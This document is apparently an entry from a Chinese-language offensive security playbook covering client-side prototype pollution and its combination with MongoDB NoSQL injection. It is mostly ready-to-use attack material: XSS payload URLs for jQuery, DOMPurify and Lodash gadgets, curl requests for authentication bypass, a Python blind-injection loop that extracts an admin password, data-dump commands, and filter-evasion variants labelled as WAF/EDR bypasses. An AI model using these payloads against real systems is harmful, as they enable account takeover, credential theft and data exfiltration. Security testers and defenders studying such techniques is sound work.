子类：**客户端利用** · tags: `原型链` `XSS` `客户端` `jQuery` `DOM` `Prototype Pollution`

**前置条件：** 目标前端使用易受影响的JS库；存在URL参数到对象转换的逻辑

**攻击链：**

**1. 1. 识别客户端污染源**
_通过URL参数和Hash片段测试前端原型链污染_
```
# URL参数解析污染(常见于自定义query parser)
https://{TARGET}/page?__proto__[polluted]=test
https://{TARGET}/page?__proto__.polluted=test
https://{TARGET}/page?constructor[prototype][polluted]=test

# Hash片段污染
https://{TARGET}/page#__proto__[polluted]=test

# 验证：在控制台检查
console.log(({}).polluted); // 如果输出"test"则确认污染
```

**2. 2. jQuery html() Gadget**
_利用jQuery的html()方法和$.extend()深拷贝实现XSS和属性注入_
```
# 污染jQuery的innerHTML gadget
# Step 1: 污染原型
https://{TARGET}/page?__proto__[innerHTML]=<img/src=x onerror=alert(document.domain)>

# Step 2: 等待jQuery调用 $(element).html() 或 $.html()
# 当jQuery创建新元素时会读取innerHTML属性

# jQuery $.extend() 深拷贝污染
$.extend(true, {}, JSON.parse('{"__proto__":{"isAdmin":true}}'));
// 之后所有 obj.isAdmin 都返回 true
```

**3. 3. DOMPurify绕过Gadget**
_通过污染DOMPurify配置、Lodash template和传输URL实现XSS_
```
# 污染DOMPurify配置实现XSS
# 绕过ALLOWED_TAGS
https://{TARGET}/page?__proto__[ALLOWED_ATTR][]=onerror&__proto__[ALLOWED_ATTR][]=src

# 污染sanitize行为
https://{TARGET}/page?__proto__[ALLOW_ARIA_ATTR]=1&__proto__[IS_ALLOWED_URI][]=javascript

# Lodash template gadget
# 如果使用 _.template 且选项被污染
https://{TARGET}/page?__proto__[sourceURL]=%22%0aalert(1)//

# 构造完整POC链接
https://{TARGET}/page?__proto__[transport_url]=javascript:alert(1)
```

**4. 4. 自动化检测脚本**
_使用Puppeteer自动化检测前端页面的原型链污染漏洞_
```
# PPScan——自动化客户端原型链污染检测
# 使用Puppeteer自动化测试
const puppeteer = require('puppeteer');
const browser = await puppeteer.launch();
const page = await browser.newPage();

// 注入检测脚本
await page.evaluateOnNewDocument(() => {
  const marker = Math.random().toString(36);
  Object.defineProperty(Object.prototype, '__pp_test__', {
    set: function(v) { window.__ppDetected = true; }
  });
});

await page.goto('https://{TARGET}/page?__proto__[__pp_test__]=1');
const detected = await page.evaluate(() => window.__ppDetected);
console.log('Prototype Pollution:', detected ? 'VULNERABLE' : 'NOT DETECTED');
```

**WAF/EDR 绕过变体：**

**1. 绕过URL参数过滤**
_通过URL编码、constructor路径和嵌套结构绕过前端原型链污染过滤_
```
# URL编码__proto__
?__%70roto__[xss]=test
?%5f%5fproto%5f%5f[xss]=test

# 使用constructor路径
?constructor[prototype][xss]=test
?constructor.prototype.xss=test

# 数组索引污染
?__proto__[0]=payload

# 多层嵌套
?a[__proto__][xss]=test
?a.b.__proto__.xss=test
```

---

### 原型链污染结合NoSQL注入  `proto-nosql-injection`
将原型链污染与MongoDB/NoSQL注入组合利用。通过污染查询对象的原型链属性，绕过认证逻辑或构造恶意查询条件，实现认证绕过和数据泄露。
子类：**组合利用** · tags: `原型链` `NoSQL` `MongoDB` `认证绕过` `组合攻击`

**前置条件：** 目标使用MongoDB；存在原型链污染点；存在查询构造逻辑

**攻击链：**

**1. 1. 识别MongoDB查询注入点**
_使用MongoDB操作符($ne/$regex/$gt)测试NoSQL注入实现认证绕过_
```
# 测试NoSQL操作符注入
curl -X POST "https://{TARGET}/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'

# $regex匹配
curl -X POST "https://{TARGET}/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$regex": ".*"}}'

# $gt永真条件
curl -X POST "https://{TARGET}/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$gt": ""}}'
```

**2. 2. 原型链污染绕过查询校验**
_利用原型链污染注入MongoDB的$where条件绕过操作符过滤_
```
# 场景：后端有操作符过滤
# if (hasOperator(input)) reject();

# 通过原型链污染注入$where
curl -X PATCH "https://{TARGET}/api/settings" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"$where": "function(){return true}"}}'

# 后续查询将继承$where条件
curl -X POST "https://{TARGET}/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "anything"}'
# 如果login查询使用了被污染的对象，$where永真条件导致认证绕过
```

**3. 3. 布尔盲注提取数据**
_使用$regex盲注逐字符提取MongoDB中存储的密码_
```
# 利用$regex逐字符提取管理员密码
import requests
import string

url = "https://{TARGET}/api/login"
password = ""
chars = string.ascii_letters + string.digits + string.punctuation

for i in range(32):
    for c in chars:
        payload = {
            "username": "admin",
            "password": {"$regex": f"^{password}{re.escape(c)}"}
        }
        r = requests.post(url, json=payload)
        if r.status_code == 200 and "token" in r.text:
            password += c
            print(f"Found: {password}")
            break

print(f"Admin password: {password}")
```

**4. 4. 数据库枚举与导出**
_利用认证绕过后的管理员权限枚举和导出敏感数据_
```
# 利用$func执行服务端JS(旧版MongoDB)
curl -X POST "https://{TARGET}/api/search" \
  -H "Content-Type: application/json" \
  -d '{"$where": "function(){return this.role==\"admin\"}"}'

# 利用已获取的认证绕过导出数据
curl -s "https://{TARGET}/api/users?limit=1000" \
  -H "Authorization: Bearer {ADMIN_TOKEN}" | jq '.[].email'

# 检查MongoDB REST接口(如果暴露)
curl -s "https://{TARGET}:28017/" 2>/dev/null
curl -s "https://{TARGET}/api/db/_stats" 2>/dev/null
```

**WAF/EDR 绕过变体：**

**1. 绕过NoSQL操作符过滤**
_通过Unicode编码、Content-Type切换和表单格式绕过NoSQL注入过滤_
```
# Unicode编码操作符
{"username": "admin", "password": {"\u0024ne": ""}}

# 嵌套绕过
{"username": "admin", "password": {"$eq": {"$ne": ""}}}

# 利用Content-Type差异
# application/x-www-form-urlencoded
username=admin&password[$ne]=&password[$regex]=.*

# 数组注入
username=admin&password[0][$gt]=
```

---
